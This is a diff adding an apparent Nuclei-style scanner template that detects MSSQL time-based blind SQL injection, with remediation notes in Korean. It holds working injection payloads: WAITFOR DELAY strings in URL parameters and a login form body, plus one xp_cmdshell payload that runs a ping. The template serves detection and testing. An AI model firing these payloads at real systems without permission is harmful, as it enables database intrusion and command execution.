@@ -1,0 +1,42 @@
+id: sqli-time-based-blind-mssql
+
+info:
+  name: MSSQL Time-Based Blind SQL Injection (WAITFOR DELAY)
+  author: security-researcher
+  severity: high
+  description: |
+    MSSQL WAITFOR DELAY 명령을 이용한 시간 기반 블라인드 SQL 인젝션을 탐지합니다.
+  tags: sqli,blind,time-based,mssql,injection
+  remediation: |
+    - Parameterized Query / Stored Procedure 사용
+    - 쿼리 타임아웃 설정 (CommandTimeout)
+    - 데이터베이스 계정 권한 최소화
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1; WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?id=1' WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?id=1' AND 1=1; WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?id=1; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/search"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "username=admin'; WAITFOR DELAY '0:0:5'--&password=test"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
